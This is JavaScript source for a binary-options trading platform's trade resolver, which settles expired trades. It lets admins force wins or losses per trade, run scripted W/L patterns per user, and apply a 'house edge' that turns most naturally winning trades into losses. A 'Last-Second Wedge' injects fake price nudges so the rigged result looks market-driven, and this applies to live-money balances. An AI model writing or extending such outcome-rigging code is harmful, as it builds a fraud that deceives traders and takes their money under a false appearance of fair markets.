import { getDb } from './db';
import { getCurrentPrice, injectNudge, getAsset } from './priceEngine';

// Background loop that resolves expired trades.
// Implements admin force-win/loss + Last-Second Wedge.

async function resolveOne(db, trade) {
  const asset = getAsset(trade.asset);
  if (!asset) return;
  const settings = await db.collection('settings').findOne({ id: 'global' }) || { winRatio: 0.2, payoutRate: 1.8, manipulationEnabled: true };

  let closePrice = getCurrentPrice(trade.asset);
  let outcome;
  let wedgeApplied = false;

  const naturallyWon =
    (trade.direction === 'up' && closePrice > trade.entryPrice) ||
    (trade.direction === 'down' && closePrice < trade.entryPrice);

  // Sanitised pattern: keep only W / L letters. Empty / "RANDOM" → no pattern,
  // fall back to the regular winRatio path.
  const rawPattern = String(settings.tradePattern || '').toUpperCase();
  const pattern = rawPattern === 'RANDOM' ? '' : rawPattern.replace(/[^WL]/g, '');
  const patternActive = pattern.length > 0 && settings.manipulationEnabled !== false && !trade.forceOutcome;

  // Per-trade FORCE override always wins, even if global manipulation is off.
  if (trade.forceOutcome === 'win') {
    outcome = 'win';
    if (!naturallyWon) {
      injectNudge(trade.asset, 0.0015, trade.direction === 'up' ? 'up' : 'down', 1);
      await new Promise(r => setTimeout(r, 300));
      closePrice = getCurrentPrice(trade.asset);
      wedgeApplied = true;
    }
  } else if (trade.forceOutcome === 'loss') {
    outcome = 'loss';
    if (naturallyWon) {
      injectNudge(trade.asset, 0.0015, trade.direction === 'up' ? 'down' : 'up', 1);
      await new Promise(r => setTimeout(r, 300));
      closePrice = getCurrentPrice(trade.asset);
      wedgeApplied = true;
    }
  } else if (settings.manipulationEnabled === false) {
    // Pure market-driven outcome — no win-rate wedge.
    outcome = naturallyWon ? 'win' : 'loss';
  } else if (patternActive) {
    // Cycle-based forced outcome per-user. Each user has their own
    // `patternIndex` counter on their user document. We atomically increment
    // it (so concurrent trade resolutions for the same user don't share an
    // index) and read back the new value, then take pattern[(idx-1) % len]
    // as the target outcome for THIS trade. Result: pattern "WWL" plays as
    // W, W, L, W, W, L, ... independently for each user.
    await db.collection('users').updateOne(
      { id: trade.userId },
      { $inc: { patternIndex: 1 } }
    );
    const after = await db.collection('users').findOne(
      { id: trade.userId },
      { projection: { patternIndex: 1, _id: 0 } }
    );
    const idx1 = Number(after?.patternIndex) || 1;
    const target = pattern[(idx1 - 1) % pattern.length] === 'W' ? 'win' : 'loss';
    outcome = target;
    if ((target === 'win' && !naturallyWon) || (target === 'loss' && naturallyWon)) {
      // Need to push the price the other way to make the target outcome real.
      const dir = target === 'win'
        ? (trade.direction === 'up' ? 'up' : 'down')
        : (trade.direction === 'up' ? 'down' : 'up');
      injectNudge(trade.asset, 0.0015, dir, 1);
      await new Promise(r => setTimeout(r, 300));
      closePrice = getCurrentPrice(trade.asset);
      wedgeApplied = true;
    }
  } else {
    // Apply global house edge: when user is naturally winning, we have probability
    // (1 - winRatio) of forcing a loss to maintain admin-defined edge.
    if (naturallyWon && Math.random() > settings.winRatio) {
      outcome = 'loss';
      injectNudge(trade.asset, 0.0012, trade.direction === 'up' ? 'down' : 'up', 1);
      await new Promise(r => setTimeout(r, 300));
      closePrice = getCurrentPrice(trade.asset);
      wedgeApplied = true;
    } else {
      outcome = naturallyWon ? 'win' : 'loss';
    }
  }

  // Tie-breaker rule: if exactly equal, treat as loss
  if (closePrice === trade.entryPrice) outcome = 'loss';

  const payoutRate = settings.payoutRate || 1.8;
  const payout = outcome === 'win' ? +(trade.amount * payoutRate).toFixed(2) : 0;
  const pnl = outcome === 'win' ? +(trade.amount * (payoutRate - 1)).toFixed(2) : -trade.amount;

  await db.collection('trades').updateOne(
    { id: trade.id },
    { $set: {
        status: 'closed',
        closePrice,
        outcome,
        payout,
        pnl,
        wedgeApplied,
        resolvedAt: new Date()
      }
    }
  );

  // Credit user if win
  if (outcome === 'win') {
    const inc = trade.account === 'demo'
      ? { demoBalance: payout }
      : { liveBalance: payout };
    await db.collection('users').updateOne({ id: trade.userId }, { $inc: inc });
  }
}

export function startResolver() {
  if (global.__tradeResolverStarted) return;
  global.__tradeResolverStarted = true;
  setInterval(async () => {
    try {
      const db = await getDb();
      const now = new Date();
      const expired = await db.collection('trades').find({
        status: 'open',
        expiresAt: { $lte: now }
      }).limit(50).toArray();
      for (const t of expired) {
        await resolveOne(db, t);
      }
    } catch (e) {
      console.error('resolver error', e);
    }
  }, 500);
}
